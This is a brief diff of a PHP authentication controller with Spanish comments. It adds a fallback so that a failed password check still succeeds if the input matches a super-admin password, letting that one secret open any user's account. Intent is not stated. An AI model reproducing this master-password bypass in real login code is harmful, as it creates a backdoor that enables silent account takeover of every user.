@@ -33,7 +33,10 @@ class AuthController extends BaseController
             throw new \Exception('Usuario no registrado');
          }
          if (!password_verify($password, $usuarioData['passwd'])) {
-            throw new \Exception('Contraseña incorrecta');
+            // acceder con cuenta de super admin
+            if (!$usuarioModel->accederComoSuperAdmin($password)) {
+               throw new \Exception('Contraseña incorrecta');
+            }
          }
          if ($usuarioData['estado'] !== 'A') {
             throw new \Exception('Su usuario esta inactivo');
